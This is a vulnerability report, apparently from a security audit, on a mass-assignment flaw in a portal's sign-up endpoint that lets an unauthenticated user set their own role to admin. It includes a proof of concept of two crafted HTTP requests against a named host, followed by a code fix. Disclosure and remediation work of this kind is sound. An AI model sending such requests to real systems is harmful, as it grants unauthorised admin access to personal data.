# \[VUL-016\] Mass Assignment Privilege Escalation on User Sign-Up

| Attribute | Details |
|---|---|
| Severity | Critical |
| CVSS v3.1 Score | 9.8 (`CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H`) |
| CVSS v4.0 Score | 9.3 (`CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:H/VA:H/SC:H/SI:H/SA:H`) |
| Vulnerability Class | OWASP A01:2021 - Broken Access Control - CWE-915: Improperly Controlled Modification of Dynamically-Determined Object Attributes |
| Affected Endpoint | `POST /api/auth/sign-up/email` — Parameter: `role` |
| Source Location | `qcu-msc-central-portal-backend/src/app.ts` (Lines 176-182) — `src/config/auth.ts` |

## 1. Vulnerability Description

The backend validates the sign-up request body using a Zod schema (`signUpSchema`) that does not include the `role` field. After validation, the middleware serializes the entire raw `req.body` when forwarding to the Better Auth handler. Because `role` is registered as an `additionalField` in Better Auth's configuration, it is accepted from the request body and written directly to the database without server-side enforcement. There is no server-side stripping of privileged fields.

## 2. Business & Technical Impact

**Technical Impact:** Any unauthenticated user can self-promote to `ADMIN_HR` or `ADMIN_LOGISTICS` at account creation time, gaining full administrative access to all student PII and applicant management functions.

**Business Impact:** Total system compromise. Regulatory non-compliance (GDPR, RA 10173 Data Privacy Act of the Philippines). Potential exposure of all enrolled student records. Reputational damage and liability.

## 3. Proof of Concept (PoC)

**Step 1:** Send a crafted sign-up request with `role` injected into the body.

```
POST /api/auth/sign-up/email HTTP/1.1
Host: api.msc-qcu.tech
Content-Type: application/json

{
  "email": "attacker@example.com",
  "password": "P@ssword123!",
  "firstName": "Attacker",
  "lastName": "User",
  "studentId": "00-0001",
  "role": "ADMIN_HR"
}
```

**Step 2:** Sign in using the created credentials.

```
POST /api/v1/auth/admin/sign-in HTTP/1.1
Host: api.msc-qcu.tech
Content-Type: application/json

{
  "email": "attacker@example.com",
  "password": "P@ssword123!"
}
```

**Expected Result:** `200 OK` with `role: "ADMIN_HR"` in the user object. Full admin access is granted.

## 4. Remediation & Guidance

**Root Cause Fix:** After Zod validation, reconstruct a clean request body using only safe fields before forwarding to Better Auth. Never forward `req.body` directly.

```typescript
req.body = {
  email: result.data.email,
  password: result.data.password,
  name: `${result.data.firstName} ${result.data.lastName}`.trim(),
  studentId: result.data.studentId,
  middleInitial: result.data.middleInitial,
  // role is intentionally OMITTED
};
```

**Short-Term Workaround:** Add an explicit `role` blocklist check returning `400` if `role` is present in `req.body`.
